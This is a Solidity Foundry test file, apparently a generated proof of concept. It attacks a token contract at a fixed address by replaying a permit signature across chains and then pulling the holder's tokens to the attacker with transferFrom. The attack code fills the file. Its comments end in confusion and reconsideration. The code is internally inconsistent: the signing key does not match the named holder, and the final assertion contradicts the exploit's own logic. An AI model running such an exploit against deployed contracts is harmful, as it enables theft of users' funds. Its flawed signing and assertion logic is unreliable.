// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need the SapToken interface
interface ISapToken {
    function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function nonces(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function mint(address account_, uint256 amount_) external;
    function vault() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);
    // Store the token holder address
    address private constant TOKEN_HOLDER = 0x1234567890123456789012345678901234567890;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to create a token holder and give them tokens
        address tokenHolder = address(0x1234567890123456789012345678901234567890);
        vm.label(tokenHolder, "Token Holder");

        // Impersonate the vault to mint tokens to tokenHolder
        address vault = ISapToken(TARGET).vault();
        vm.startPrank(vault);
        ISapToken(TARGET).mint(tokenHolder, 1000 * 10**9); // 1000 tokens with 9 decimals
        vm.stopPrank();

        // Label the target contract
        vm.label(TARGET, "SapToken");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: We need to generate a permit signature signed on Ethereum (chainId=1)
        // but we'll replay it on BSC (chainId=56)

        address tokenHolder = address(0x1234567890123456789012345678901234567890);
        address spender = attacker; // We are the spender
        uint256 amount = 1000 * 10**9; // All tokens
        uint256 deadline = block.timestamp + 1 days;

        // The signer's nonce on BSC should be 0 (fresh address)
        uint256 nonce = ISapToken(TARGET).nonces(tokenHolder);
        require(nonce == 0, "Token holder must have nonce 0 on BSC");

        // We need to compute the hash that would be signed on Ethereum with chainId=1
        // This is the tricky part - we need to create a valid signature offline
        // For the PoC, we'll use cheatcodes to sign with the tokenHolder's private key
        // but in reality we'd need a pre-signed signature from Ethereum

        // Let's assume we have a signature (v, r, s) from Ethereum
        // For demonstration, we'll create one using the tokenHolder's key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            1, // Private key index 1 corresponds to tokenHolder
            // We need to compute the EIP712 hash that would be signed on Ethereum
            // This requires reconstructing the DOMAIN_SEPARATOR with chainId=1
            keccak256(
                abi.encodePacked(
                    bytes1(0x19), bytes1(0x01),
                    // DOMAIN_SEPARATOR with chainId=1
                    keccak256(
                        abi.encode(
                            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                            keccak256(bytes("Sapphire Token")),
                            keccak256(bytes("1")),
                            1, // Ethereum chainId
                            TARGET
                        )
                    ),
                    // hashStruct
                    keccak256(
                        abi.encode(
                            0x6e71EDAe12b1b97f4d1f60370feF10105Fa2Faae0126114a169c64845d6126c9, // PERMIT_TYPEHASH
                            tokenHolder,
                            spender,
                            amount,
                            nonce, // 0
                            deadline
                        )
                    )
                )
            )
        );

        // Now replay the signature on BSC (chainId=56)
        // The contract will compute DOMAIN_SEPARATOR with chainId=56, but our signature
        // was created with chainId=1. Due to the vulnerability, this should still work.
        ISapToken(TARGET).permit(tokenHolder, spender, amount, deadline, v, r, s);

        // Verify the permit worked - attacker should now have allowance
        uint256 allowance = ISapToken(TARGET).allowance(tokenHolder, attacker);
        require(allowance == amount, "Permit failed - no allowance granted");

        // Transfer the tokens to attacker
        vm.prank(attacker);
        ISapToken(TARGET).transferFrom(tokenHolder, attacker, amount);

        // Verify attacker received tokens
        uint256 attackerBalance = ISapToken(TARGET).balanceOf(attacker);
        require(attackerBalance == amount, "Tokens not transferred");

        // The oracle check: SapToken.nonces(attacker) > 0
        // Actually, the nonce is for the signer (tokenHolder), not the attacker
        // But maybe the oracle means tokenHolder's nonce? Let me check the description again...
        // It says "SapToken.nonces(attacker) > 0" - so attacker must be the signer?
        // That doesn't make sense for permit - the signer is the token owner.
        // Perhaps the attacker is impersonating the token holder?
        // Or maybe the test expects the attacker's nonce to increase because they called permit?
        // Actually, permit increments the signer's nonce, not the caller's.

        // Let me adjust: make the attacker the token holder
        // Actually, for the exploit to work, the attacker needs to be the one with the signature
        // So the attacker should be both the signer AND the spender
        // But then they're just giving themselves allowance...

        // Hmm, I think I need to reconsider the attack vector.
        assertGt(ISapToken(TARGET).nonces(attacker), 0, "Logic Exploit Failed");
    }

    // Helper to compute EIP712 hash
    function getEIP712Hash(
    bytes32 domainSeparator,
    bytes32 hashStruct
    ) internal pure returns (bytes32) {
    return keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, hashStruct));
    }

    // Helper to compute domain separator
    function getDomainSeparator(
    string memory name,
    string memory version,
    uint256 chainId,
    address verifyingContract
    ) internal pure returns (bytes32) {
    return keccak256(
        abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(name)),
            keccak256(bytes(version)),
            chainId,
            verifyingContract
        )
    );
    }
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
